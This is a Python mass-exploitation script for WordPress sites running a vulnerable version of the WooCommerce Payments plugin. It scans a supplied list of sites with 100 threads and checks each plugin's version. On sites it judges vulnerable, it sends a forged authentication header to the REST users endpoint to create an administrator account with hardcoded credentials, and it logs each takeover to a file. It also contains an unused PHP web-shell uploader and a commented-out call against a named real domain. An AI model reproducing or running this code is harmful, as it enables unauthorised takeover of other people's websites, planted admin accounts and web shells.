# -*-coding:Latin-1 -*
import sys , requests, re
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init
init(autoreset=True)

fr  =   Fore.RED
fc  =   Fore.CYAN
fw  =   Fore.WHITE
fg  =   Fore.GREEN
fm  =   Fore.MAGENTA



shell = """<?php echo "Raiz0WorM"; echo "<br>".php_uname()."<br>"; echo "<form method='post' enctype='multipart/form-data'> <input type='file' name='zb'><input type='submit' name='upload' value='upload'></form>"; if($_POST['upload']) { if(@copy($_FILES['zb']['tmp_name'], $_FILES['zb']['name'])) { echo "eXploiting Done"; } else { echo "Failed to Upload."; } } ?>"""
requests.urllib3.disable_warnings()
headers = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}


exph = {
        'User-Agent': 'Secragon Offensive Agent',
        'X-WCPAY-PLATFORM-CHECKOUT-USER': '1'
    }


#here for list input

try:
#if(False):
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
#if(False):
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')



def URLdomain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    else :
        pass
    pattern = re.compile('(.*)/')
    while re.findall(pattern,site):
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site


def get_content(i):
    req = requests.get(i,headers=headers,timeout=10,verify=False)
    return(req.text)


def add_admin0(i):
    session = requests.Session()
    data_login =  {
        'rest_route' : '/wp/v2/users',
		'username' : 'rangexxx',
		'email': 'rangexxx127@gmail.com',
		'password': 'Rangexxx127',
		'roles':'administrator'
        }
    
    wpadmin = i + "/wp-json/wp/v2/users"
    checking = session.post(wpadmin,  data=data_login, headers=exph, verify=False, timeout=30)
    response = checking.text
   # print(response)
    if('wp-admin-bar-logout' in response or 'nickname' in response):
        print('==> Fucked: '+i+'/wp-login.php#rangexxx@Rangexxx127')
        with open('admin.txt','a') as off:
            off.writelines(i+'/wp-login.php#rangexxx@Rangexxx127\n')
    


    else:
        print('[***] Failed To create new admin: '+i)








def checker(i):
    i = i.rstrip()
    i = 'http://' + URLdomain(i)
    print(i)
    ver = i +'/wp-content/plugins/woocommerce-payments/readme.txt'
    con = get_content(ver)
    version = re.search("Stable tag: (.*)", con).groups()[0]
    version = version.replace('.','')
    if(int(version) < 562):
        print('Vuln: '+i)
        with open('Vulnerable.txt','a') as kkk:
            kkk.writelines(i+'\n')
        add_admin0(i)
    
		
    else:
        print('[***] Failed: '+i)



def monster(i):
    try:
        checker(i)
    except:
        pass


mp = Pool(100)
mp.map(monster, target)
mp.close()
mp.join()

#add_admin0('http://onejworld.com/')











































